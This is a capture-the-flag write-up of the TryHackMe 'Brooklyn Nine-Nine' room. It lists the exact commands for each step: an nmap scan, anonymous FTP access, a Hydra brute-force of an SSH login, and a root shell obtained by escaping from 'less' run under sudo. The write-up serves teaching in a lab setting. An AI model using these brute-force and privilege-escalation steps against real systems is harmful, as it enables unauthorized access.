# 🚔 Brooklyn Nine-Nine - TryHackMe Writeup

## Objective

Gain initial access to the target machine, retrieve the user flag, and escalate privileges to obtain root access.

---

# Task 1 - Enumeration

The first step was to perform a service scan against the target machine.

```bash
nmap -A -p 0-10000 <TARGET_IP> -Pn
```

## Scan Results

```text
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
```

Three services were identified:

* FTP
* SSH
* HTTP

Since web services often reveal useful information, I started with HTTP.

---

# Task 2 - Web Enumeration

Opening the target IP in the browser displayed a Brooklyn Nine-Nine themed image.

Although the page looked simple, I inspected the source code using browser developer tools.

A hidden comment suggested that additional information might be embedded within the image.

## Steganography Check

I downloaded the image and examined it using:

```bash
strings image.jpg
```

After reviewing the output, no useful information was discovered.

This appeared to be a distraction, so I moved on to the next service.

---

# Task 3 - FTP Enumeration

The Nmap scan showed that FTP was available.

I connected using:

```bash
ftp <TARGET_IP>
```

The server allowed anonymous access without requiring a password.

After logging in:

```bash
ls
```

I found a text file.

The file was downloaded using:

```bash
get note_to_jake.txt
```

Viewing the file contents revealed several names:

```text
Jake
Amy
Holt
```

These appeared to be potential usernames.

---

# Task 4 - SSH Access

Since FTP revealed possible usernames, I attempted SSH access.

```bash
ssh jake@<TARGET_IP>
```

A password was required.

To identify the password, I performed a brute-force attack using Hydra.

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
```

After some time, Hydra successfully recovered Jake's password.

Using the discovered credentials:

```bash
ssh jake@<TARGET_IP>
```

I successfully obtained a shell on the target machine.

---

# Task 5 - User Flag

After gaining access, I began enumerating the filesystem.

```bash
pwd
ls -la
find / -name "*.txt" 2>/dev/null
```

During enumeration, the user flag was located.

```bash
cat user.txt
```

The flag was successfully retrieved.

### User Flag

```text
[USER FLAG]
```

---

# Task 6 - Privilege Escalation Enumeration

The next objective was obtaining root access.

A direct attempt failed:

```bash
sudo su
```

To identify commands Jake could execute with elevated privileges:

```bash
sudo -l
```

## Result

The output showed that Jake could execute:

```text
/usr/bin/less
```

with sudo privileges.

This is dangerous because `less` can be abused to spawn a shell.

---

# Task 7 - Root Access

Searching GTFOBins for the `less` binary revealed a privilege escalation technique.

First, execute:

```bash
sudo less /etc/hosts
```

Once inside less, type:

```bash
!/bin/sh
```

This spawned a shell running with root privileges.

Verification:

```bash
whoami
```

Output:

```text
root
```

Root access was successfully obtained.

---

# Task 8 - Root Flag

Navigate to the root directory:

```bash
cd /root
ls
```

The root flag file was present.

```bash
cat root.txt
```

### Root Flag

```text
[ROOT FLAG]
```

---

# Commands Used

```bash
nmap -A -p 0-10000 <TARGET_IP> -Pn

ftp <TARGET_IP>

ls
get note_to_jake.txt

ssh jake@<TARGET_IP>

hydra -l jake -P rockyou.txt ssh://<TARGET_IP>

sudo -l

sudo less /etc/hosts

!/bin/sh

whoami
```

---

# Attack Path Summary

```text
Nmap Scan
    ↓
HTTP Enumeration
    ↓
FTP Anonymous Login
    ↓
Discover Usernames
    ↓
Hydra SSH Brute Force
    ↓
SSH Access as Jake
    ↓
User Flag
    ↓
sudo -l Enumeration
    ↓
LESS Privilege Escalation
    ↓
Root Shell
    ↓
Root Flag
```

---

# Key Takeaways

* Always enumerate every open service.
* Anonymous FTP access can leak sensitive information.
* Usernames discovered from one service can often be used against another.
* Hydra is useful for password attacks against exposed services.
* `sudo -l` should always be checked during privilege escalation.
* GTFOBins is an excellent resource for exploiting misconfigured sudo permissions.

---

# Conclusion

Brooklyn Nine-Nine is a beginner-friendly room that demonstrates the importance of enumeration. By chaining together information from FTP, SSH, and sudo misconfigurations, it was possible to gain initial access and escalate privileges to root. The room provides a practical introduction to Linux enumeration and privilege escalation techniques.
